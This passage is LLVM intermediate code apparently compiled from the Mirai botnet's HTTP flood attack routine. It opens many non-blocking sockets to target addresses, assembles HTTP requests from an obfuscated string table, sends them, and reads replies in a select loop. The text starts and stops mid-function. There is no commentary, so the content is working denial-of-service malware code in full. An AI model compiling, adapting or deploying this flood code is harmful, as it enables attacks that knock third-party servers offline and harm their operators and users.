; <label>:64:                                     ; preds = %.lr.ph656, %95
  %indvars.iv681 = phi i64 [ 0, %.lr.ph656 ], [ %indvars.iv.next682, %95 ]
  %65 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 1
  store i8 0, i8* %65, align 4
  %66 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 0
  store i32 -1, i32* %66, align 4
  %67 = trunc i64 %indvars.iv681 to i32
  %68 = srem i32 %67, %52
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 4
  store i32 %71, i32* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 6, i64 0
  %74 = tail call i32 @util_strcpy(i8* %73, i8* %17) #9
  %75 = load i8, i8* %73, align 4
  %76 = icmp eq i8 %75, 47
  br i1 %76, label %81, label %77

; <label>:77:                                     ; preds = %64
  %78 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 6, i64 1
  %79 = tail call i32 @util_strlen(i8* %73) #9
  %80 = sext i32 %79 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %78, i8* %73, i64 %80, i32 1, i1 false)
  store i8 47, i8* %73, align 4
  br label %81

; <label>:81:                                     ; preds = %64, %77
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 10, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15) #9
  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 9, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %15) #9
  %86 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 7, i64 0
  %87 = tail call i32 @util_strcpy(i8* %86, i8* %16) #9
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 2
  %89 = load i8, i8* %88, align 4
  %90 = icmp ult i8 %89, 32
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %70, align 4
  %93 = tail call i32 @ntohl(i32 %92) #10
  %94 = tail call i32 @htonl(i32 %93) #10
  store i32 %94, i32* %72, align 4
  br label %95

; <label>:95:                                     ; preds = %91, %81
  tail call void @table_unlock_val(i8 zeroext 47)
  %96 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv681, i32 5, i64 0
  %97 = tail call i8* @table_retrieve_val(i32 47, i32* null)
  %98 = tail call i32 @util_strcpy(i8* %96, i8* %97) #9
  tail call void @table_lock_val(i8 zeroext 47)
  %99 = tail call i32 @util_strcpy(i8* %73, i8* %17) #9
  %indvars.iv.next682 = add nuw nsw i64 %indvars.iv681, 1
  %100 = icmp slt i64 %indvars.iv.next682, %48
  br i1 %100, label %64, label %.preheader615.loopexit

.backedge616.loopexit:                            ; preds = %.loopexit611
  br label %.backedge616.backedge

.backedge616:                                     ; preds = %.backedge616.backedge, %.preheader615
  %101 = call i64 @time(i64* null) #9
  %102 = trunc i64 %101 to i32
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %53) #9, !srcloc !1
  %104 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #9, !srcloc !2
  br i1 %51, label %.lr.ph635.preheader, label %.backedge616.backedge

.lr.ph635.preheader:                              ; preds = %.backedge616
  br label %.lr.ph635

.lr.ph635:                                        ; preds = %.lr.ph635.preheader, %373
  %indvars.iv = phi i64 [ %indvars.iv.next, %373 ], [ 0, %.lr.ph635.preheader ]
  %.0550632 = phi i32 [ %.1551, %373 ], [ 0, %.lr.ph635.preheader ]
  %105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %107 = load i8, i8* %106, align 4
  %108 = icmp eq i8 %107, 1
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %.lr.ph635
  %110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %111 = load i32, i32* %110, align 4
  %112 = icmp ne i32 %111, 0
  %.sink = select i1 %112, i8 4, i8 0
  store i8 %.sink, i8* %106, align 4
  br label %113

; <label>:113:                                    ; preds = %109, %.lr.ph635
  %114 = phi i8 [ %.sink, %109 ], [ %107, %.lr.ph635 ]
  switch i8 %114, label %369 [
    i8 0, label %115
    i8 2, label %147
    i8 4, label %169
    i8 6, label %330
    i8 7, label %343
    i8 10, label %356
  ]

; <label>:115:                                    ; preds = %113
  call void @llvm.memset.p0i8.i64(i8* nonnull %56, i8 0, i64 16, i32 4, i1 false)
  %116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %117 = load i32, i32* %116, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %121, label %119

; <label>:119:                                    ; preds = %115
  %120 = call i32 @close(i32 %117) #9
  br label %121

; <label>:121:                                    ; preds = %115, %119
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %122, i32* %116, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %373, label %124

; <label>:124:                                    ; preds = %121
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 3, i32 0) #9
  %126 = or i32 %125, 2048
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 4, i32 %126) #9
  store i32 65535, i32* %5, align 4
  %128 = load i32, i32* %116, align 4
  %129 = call i32 @setsockopt(i32 %128, i32 0, i32 8, i8* nonnull %57, i32 4) #9
  store i16 2, i16* %58, align 4
  %130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %131 = load i32, i32* %130, align 4
  store i32 %131, i32* %59, align 4
  %132 = call zeroext i16 @htons(i16 zeroext %20) #10
  store i16 %132, i16* %60, align 2
  %133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %102, i32* %133, align 4
  store i8 2, i8* %106, align 4
  %134 = load i32, i32* %116, align 4
  %135 = call i32 @connect(i32 %134, %struct.sockaddr* nonnull %61, i32 16) #9
  %136 = load i32, i32* %116, align 4
  %137 = srem i32 %136, 64
  %138 = zext i32 %137 to i64
  %139 = shl i64 1, %138
  %140 = sdiv i32 %136, 64
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %141
  %143 = load i64, i64* %142, align 8
  %144 = or i64 %139, %143
  store i64 %144, i64* %142, align 8
  %145 = icmp sgt i32 %136, %.0550632
  %146 = add nsw i32 %136, 1
  %..0550 = select i1 %145, i32 %146, i32 %.0550632
  br label %373

; <label>:147:                                    ; preds = %113
  %148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %149 = load i32, i32* %148, align 4
  %150 = sub i32 %102, %149
  %151 = icmp ugt i32 %150, 30
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %147
  store i8 0, i8* %106, align 4
  %153 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @close(i32 %154) #9
  store i32 -1, i32* %153, align 4
  br label %373

; <label>:156:                                    ; preds = %147
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %158 = load i32, i32* %157, align 4
  %159 = srem i32 %158, 64
  %160 = zext i32 %159 to i64
  %161 = shl i64 1, %160
  %162 = sdiv i32 %158, 64
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %163
  %165 = load i64, i64* %164, align 8
  %166 = or i64 %161, %165
  store i64 %166, i64* %164, align 8
  %167 = icmp sgt i32 %158, %.0550632
  %168 = add nsw i32 %158, 1
  %..0550570 = select i1 %167, i32 %168, i32 %.0550632
  br label %373

; <label>:169:                                    ; preds = %113
  %170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %170, align 4
  %171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %171, align 4
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %172, i32 1024) #9
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %173, align 4
  call void @util_zero(i8* nonnull %62, i32 10240) #9
  %174 = call i32 @util_strlen(i8* nonnull %62) #9
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %178 = call i32 @util_strcpy(i8* %176, i8* %177) #9
  %179 = call i32 @util_strlen(i8* nonnull %62) #9
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %180
  %182 = call i32 @util_strcpy(i8* %181, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #9
  %183 = call i32 @util_strlen(i8* nonnull %62) #9
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %187 = call i32 @util_strcpy(i8* %185, i8* %186) #9
  %188 = call i32 @util_strlen(i8* nonnull %62) #9
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %189
  %191 = call i32 @util_strcpy(i8* %190, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #9
  %192 = call i32 @util_strlen(i8* nonnull %62) #9
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %196 = call i32 @util_strcpy(i8* %194, i8* %195) #9
  %197 = call i32 @util_strlen(i8* nonnull %62) #9
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %198
  %200 = call i32 @util_strcpy(i8* %199, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #9
  %201 = call i32 @util_strlen(i8* nonnull %62) #9
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %205 = call i32 @util_strcpy(i8* %203, i8* %204) #9
  %206 = call i32 @util_strlen(i8* nonnull %62) #9
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %207
  %209 = call i32 @util_strcpy(i8* %208, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 32)
  %210 = call i32 @util_strlen(i8* nonnull %62) #9
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %211
  %213 = call i8* @table_retrieve_val(i32 32, i32* null)
  %214 = call i32 @util_strcpy(i8* %212, i8* %213) #9
  call void @table_lock_val(i8 zeroext 32)
  %215 = call i32 @util_strlen(i8* nonnull %62) #9
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %216
  %218 = call i32 @util_strcpy(i8* %217, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 33)
  %219 = call i32 @util_strlen(i8* nonnull %62) #9
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %220
  %222 = call i8* @table_retrieve_val(i32 33, i32* null)
  %223 = call i32 @util_strcpy(i8* %221, i8* %222) #9
  call void @table_lock_val(i8 zeroext 33)
  %224 = call i32 @util_strlen(i8* nonnull %62) #9
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %225
  %227 = call i32 @util_strcpy(i8* %226, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  call void @table_unlock_val(i8 zeroext 34)
  %228 = call i32 @util_strlen(i8* nonnull %62) #9
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %229
  %231 = call i8* @table_retrieve_val(i32 34, i32* null)
  %232 = call i32 @util_strcpy(i8* %230, i8* %231) #9
  call void @table_lock_val(i8 zeroext 34)
  %233 = call i32 @util_strlen(i8* nonnull %62) #9
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %234
  %236 = call i32 @util_strcpy(i8* %235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br i1 %63, label %237, label %265

; <label>:237:                                    ; preds = %169
  call void @table_unlock_val(i8 zeroext 35)
  %238 = call i32 @util_strlen(i8* nonnull %62) #9
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %239
  %241 = call i8* @table_retrieve_val(i32 35, i32* null)
  %242 = call i32 @util_strcpy(i8* %240, i8* %241) #9
  call void @table_lock_val(i8 zeroext 35)
  %243 = call i32 @util_strlen(i8* nonnull %62) #9
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %244
  %246 = call i32 @util_strcpy(i8* %245, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  %247 = call i32 @util_strlen(i8* nonnull %62) #9
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %248
  %250 = call i8* @table_retrieve_val(i32 40, i32* null)
  %251 = call i32 @util_strcpy(i8* %249, i8* %250) #9
  %252 = call i32 @util_strlen(i8* nonnull %62) #9
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %253
  %255 = call i32 @util_strcpy(i8* %254, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #9
  %256 = call i32 @util_strlen(i8* nonnull %14) #9
  %257 = call i32 @util_strlen(i8* nonnull %62) #9
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %258
  %260 = call i8* @util_itoa(i32 %256, i32 10, i8* %259) #9
  %261 = call i32 @util_strlen(i8* nonnull %62) #9
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %262
  %264 = call i32 @util_strcpy(i8* %263, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br label %265

; <label>:265:                                    ; preds = %237, %169
  %266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %267 = load i32, i32* %266, align 4
  %268 = icmp sgt i32 %267, 0
  br i1 %268, label %269, label %296

; <label>:269:                                    ; preds = %265
  %270 = call i32 @util_strlen(i8* nonnull %62) #9
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %271
  %273 = call i32 @util_strcpy(i8* %272, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #9
  store i32 0, i32* %5, align 4
  %274 = load i32, i32* %266, align 4
  %275 = icmp sgt i32 %274, 0
  %276 = call i32 @util_strlen(i8* nonnull %62) #9
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %277
  br i1 %275, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %269
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %279 = phi i8* [ %294, %.lr.ph ], [ %278, %.lr.ph.preheader ]
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %281, i64 0
  %283 = call i32 @util_strcpy(i8* %279, i8* %282) #9
  %284 = call i32 @util_strlen(i8* nonnull %62) #9
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %285
  %287 = call i32 @util_strcpy(i8* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #9
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = load i32, i32* %266, align 4
  %291 = icmp slt i32 %289, %290
  %292 = call i32 @util_strlen(i8* nonnull %62) #9
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %293
  br i1 %291, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %269
  %.lcssa = phi i8* [ %278, %269 ], [ %294, %._crit_edge.loopexit ]
  %295 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br label %296

; <label>:296:                                    ; preds = %._crit_edge, %265
  %297 = call i32 @util_strlen(i8* nonnull %62) #9
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %298
  %300 = call i32 @util_strcpy(i8* %299, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #9
  br i1 %63, label %301, label %306

; <label>:301:                                    ; preds = %296
  %302 = call i32 @util_strlen(i8* nonnull %62) #9
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %303
  %305 = call i32 @util_strcpy(i8* %304, i8* nonnull %14) #9
  br label %306

; <label>:306:                                    ; preds = %301, %296
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %308 = call signext i8 @util_strcmp(i8* nonnull %177, i8* %307) #9
  %309 = icmp eq i8 %308, 0
  br i1 %309, label %310, label %312

; <label>:310:                                    ; preds = %306
  %311 = call i32 @util_strcpy(i8* nonnull %177, i8* %307) #9
  br label %312

; <label>:312:                                    ; preds = %306, %310
  %313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %314 = load i32, i32* %313, align 4
  %315 = call i32 @util_strlen(i8* nonnull %62) #9
  %316 = sext i32 %315 to i64
  %317 = call i64 @send(i32 %314, i8* nonnull %62, i64 %316, i32 16384) #9
  %318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %102, i32* %318, align 4
  store i8 6, i8* %106, align 4
  %319 = load i32, i32* %313, align 4
  %320 = srem i32 %319, 64
  %321 = zext i32 %320 to i64
  %322 = shl i64 1, %321
  %323 = sdiv i32 %319, 64
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %324
  %326 = load i64, i64* %325, align 8
  %327 = or i64 %322, %326
  store i64 %327, i64* %325, align 8
  %328 = icmp sgt i32 %319, %.0550632
  %329 = add nsw i32 %319, 1
  %..0550571 = select i1 %328, i32 %329, i32 %.0550632
  br label %373

; <label>:330:                                    ; preds = %113
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %332 = load i32, i32* %331, align 4
  %333 = srem i32 %332, 64
  %334 = zext i32 %333 to i64
  %335 = shl i64 1, %334
  %336 = sdiv i32 %332, 64
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %337
  %339 = load i64, i64* %338, align 8
  %340 = or i64 %335, %339
  store i64 %340, i64* %338, align 8
  %341 = icmp sgt i32 %332, %.0550632
  %342 = add nsw i32 %332, 1
  %..0550572 = select i1 %341, i32 %342, i32 %.0550632
  br label %373

; <label>:343:                                    ; preds = %113
  %344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %345 = load i32, i32* %344, align 4
  %346 = srem i32 %345, 64
  %347 = zext i32 %346 to i64
  %348 = shl i64 1, %347
  %349 = sdiv i32 %345, 64
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %350
  %352 = load i64, i64* %351, align 8
  %353 = or i64 %348, %352
  store i64 %353, i64* %351, align 8
  %354 = icmp sgt i32 %345, %.0550632
  %355 = add nsw i32 %345, 1
  %..0550573 = select i1 %354, i32 %355, i32 %.0550632
  br label %373

; <label>:356:                                    ; preds = %113
  %357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = srem i32 %358, 64
  %360 = zext i32 %359 to i64
  %361 = shl i64 1, %360
  %362 = sdiv i32 %358, 64
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %363
  %365 = load i64, i64* %364, align 8
  %366 = or i64 %361, %365
  store i64 %366, i64* %364, align 8
  %367 = icmp sgt i32 %358, %.0550632
  %368 = add nsw i32 %358, 1
  %..0550574 = select i1 %367, i32 %368, i32 %.0550632
  br label %373

; <label>:369:                                    ; preds = %113
  store i8 0, i8* %106, align 4
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %371 = load i32, i32* %370, align 4
  %372 = call i32 @close(i32 %371) #9
  store i32 -1, i32* %370, align 4
  br label %373

; <label>:373:                                    ; preds = %356, %343, %330, %312, %156, %124, %369, %121, %152
  %.1551 = phi i32 [ %.0550632, %121 ], [ %.0550632, %152 ], [ %.0550632, %369 ], [ %..0550, %124 ], [ %..0550570, %156 ], [ %..0550571, %312 ], [ %..0550572, %330 ], [ %..0550573, %343 ], [ %..0550574, %356 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %374 = icmp slt i64 %indvars.iv.next, %48
  br i1 %374, label %.lr.ph635, label %._crit_edge636

._crit_edge636:                                   ; preds = %373
  %375 = icmp eq i32 %.1551, 0
  br i1 %375, label %.backedge616.backedge, label %376

.backedge616.backedge:                            ; preds = %._crit_edge636, %376, %.backedge616, %.backedge616.loopexit
  br label %.backedge616

; <label>:376:                                    ; preds = %._crit_edge636
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %377 = call i32 @select(i32 %.1551, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #9
  %378 = call i64 @time(i64* null) #9
  %379 = trunc i64 %378 to i32
  %380 = icmp slt i32 %377, 1
  %brmerge = or i1 %380, %.not
  br i1 %brmerge, label %.backedge616.backedge, label %.lr.ph653.preheader

.lr.ph653.preheader:                              ; preds = %376
  br label %.lr.ph653

.lr.ph653:                                        ; preds = %.lr.ph653.preheader, %.loopexit611
  %indvars.iv679 = phi i64 [ %indvars.iv.next680, %.loopexit611 ], [ 0, %.lr.ph653.preheader ]
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 0
  %382 = load i32, i32* %381, align 4
  %383 = icmp eq i32 %382, -1
  br i1 %383, label %.loopexit611, label %384

; <label>:384:                                    ; preds = %.lr.ph653
  %385 = sdiv i32 %382, 64
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %386
  %388 = load i64, i64* %387, align 8
  %389 = srem i32 %382, 64
  %390 = zext i32 %389 to i64
  %391 = shl i64 1, %390
  %392 = and i64 %388, %391
  %393 = icmp eq i64 %392, 0
  br i1 %393, label %405, label %394

; <label>:394:                                    ; preds = %384
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %395 = call i32 @getsockopt(i32 %382, i32 1, i32 4, i8* nonnull %55, i32* nonnull %13) #9
  %396 = load i32, i32* %12, align 4
  %397 = or i32 %396, %395
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %399, label %401

; <label>:399:                                    ; preds = %394
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  store i8 4, i8* %400, align 4
  %.pre683 = load i32, i32* %381, align 4
  br label %405

; <label>:401:                                    ; preds = %394
  %402 = load i32, i32* %381, align 4
  %403 = call i32 @close(i32 %402) #9
  store i32 -1, i32* %381, align 4
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  store i8 0, i8* %404, align 4
  br label %.loopexit611

; <label>:405:                                    ; preds = %384, %399
  %406 = phi i32 [ %382, %384 ], [ %.pre683, %399 ]
  %407 = sdiv i32 %406, 64
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %408
  %410 = load i64, i64* %409, align 8
  %411 = srem i32 %406, 64
  %412 = zext i32 %411 to i64
  %413 = shl i64 1, %412
  %414 = and i64 %413, %410
  %415 = icmp eq i64 %414, 0
  br i1 %415, label %.loopexit611, label %416

; <label>:416:                                    ; preds = %405
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 1
  %418 = load i8, i8* %417, align 4
  switch i8 %418, label %.loopexit611 [
    i8 6, label %427
    i8 7, label %.preheader610
    i8 10, label %.preheader612.preheader
  ]

.preheader612.preheader:                          ; preds = %416
  br label %.preheader612

.preheader610:                                    ; preds = %416
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 17
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 0
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 2
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 14
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 13
  %426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 15
  br label %878

; <label>:427:                                    ; preds = %416
  call void @util_zero(i8* nonnull %21, i32 10240) #9
  %428 = load i32, i32* %381, align 4
  %429 = call i64 @recv(i32 %428, i8* nonnull %21, i64 10240, i32 16386) #9
  %430 = trunc i64 %429 to i32
  %431 = icmp slt i32 %430, 1
  br i1 %431, label %432, label %435

; <label>:432:                                    ; preds = %427
  %433 = load i32, i32* %381, align 4
  %434 = call i32 @close(i32 %433) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:435:                                    ; preds = %427
  %436 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %437 = icmp eq i32 %436, -1
  %438 = icmp slt i32 %430, 10240
  %or.cond5 = and i1 %438, %437
  br i1 %or.cond5, label %.loopexit611, label %439

; <label>:439:                                    ; preds = %435
  %440 = sext i32 %436 to i64
  %441 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %440
  store i8 0, i8* %441, align 1
  %442 = call i8* @table_retrieve_val(i32 46, i32* null)
  %443 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %442) #9
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %447, label %445

; <label>:445:                                    ; preds = %439
